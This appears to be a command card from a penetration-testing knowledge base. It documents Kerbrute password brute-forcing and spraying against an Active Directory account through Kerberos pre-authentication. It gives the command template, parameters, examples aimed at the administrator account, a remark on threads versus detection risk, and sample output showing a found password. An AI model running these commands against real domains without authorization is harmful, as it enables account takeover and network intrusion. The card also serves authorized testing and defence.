---
id: ac15dde6-ed43-4283-bbaa-6a56090ce878
name: kerbrute-password-bruteforce
type: command
executor: bash
data: kerbrute bruteforce --dc $_DC_HOST -d $_DOMAIN $_USERNAME $_PASSWORDLIST_FILE
output: null
created_at: '2023-04-06T03:56:04.223770+00:00'
updated_at: '2023-04-10T20:26:23.736913+00:00'
platforms:
  - Linux
  - Windows
tags:
  - brute-force
  - active-directory
verified: true
validated: true
---

# kerbrute-password-bruteforce

## Command

```bash
kerbrute bruteforce --dc $_DC_HOST -d $_DOMAIN $_USERNAME $_PASSWORDLIST_FILE
```

## Description

This command performs a brute force or password spray attack against a specific username using Kerbrute, testing each password in the provided list via Kerberos pre-authentication to the Domain Controller.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --dc $_DC_HOST | IP address or hostname of the Domain Controller | Yes |
| -d $_DOMAIN | Target domain name (e.g., contoso.local) | Yes |
| $_USERNAME | Single valid username to target (e.g., administrator) | Yes |
| $_PASSWORDLIST_FILE | Path to a text file with one password per line | Yes |

## Examples

### Basic Usage

```bash
kerbrute bruteforce --dc 10.0.0.1 -d contoso.local administrator /path/to/passwords.txt
```

### Advanced Usage

```bash
kerbrute bruteforce --dc dc.contoso.local -d contoso.local user1 passwords.txt -t 10
```
(Uses -t 10 for 10 threads to speed up, but increases detection risk.)

## Expected Output

Failed passwords show [-], successful [+]:

```
2023/10/01 12:00:00 [-] Invalid password for administrator@contoso.local: wrongpass
2023/10/01 12:00:00 [+] VALID PASSWORD: Summer20 for administrator@contoso.local
2023/10/01 12:00:00 Finished password spraying. Found 1 valid passwords.
```

## Related

- [[procedures/Kerberos-Pre-Auth-Bruteforcing-with-Kerbrute]]
- [[commands/kerbrute-user-enumeration]]
